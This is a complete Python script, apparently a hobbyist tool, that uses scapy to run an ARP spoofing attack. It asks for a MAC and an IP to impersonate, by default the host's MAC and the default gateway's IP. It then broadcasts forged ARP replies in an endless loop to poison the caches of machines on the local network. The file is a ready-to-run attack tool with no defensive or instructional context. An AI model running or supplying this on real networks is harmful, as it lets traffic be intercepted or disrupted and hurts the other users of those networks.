#!/usr/bin/env python3
#Created by PepeBigotes

from scapy.all import *

os.system('cls' if os.name=='nt' else 'clear')
print("┌─┐┬─┐┌─┐   ┌─┐┌─┐┌─┐┌─┐┌─┐┌─┐┬─┐")
print("├─┤├┬┘├─┘───└─┐├─┘│ ││ │├┤ ├┤ ├┬┘")
print("┴ ┴┴└─┴     └─┘┴  └─┘└─┘└  └─┘┴└─\n")


try:
    mac = input("MAC to spoof (leave blank for host MAC):\n > ")
    ip = input("IP to spoof (leave blank for default gateway):\n > ")
    SRC_MAC = mac if mac else Ether().src
    SRC_IP = ip if ip else conf.route.route('8.8.8.8')[2]
    DST_MAC = 'ff:ff:ff:ff:ff:ff'
    DST_IP = '255.255.255.255'

    print(f"\nsrc: {SRC_MAC} ; {SRC_IP}")
    print(f"dst: {DST_MAC} ; {DST_IP}\n")

    pkt = Ether(src=SRC_MAC, dst=DST_MAC) /\
          ARP(op=2, hwsrc=SRC_MAC, psrc=SRC_IP, hwdst=DST_MAC, pdst=DST_IP)

    print("Sending packets, press CTRL+C to stop.")
    sendp(pkt, loop=1, inter=0.05)
except KeyboardInterrupt:
    print('\nKeyboardInterrupt')
    exit()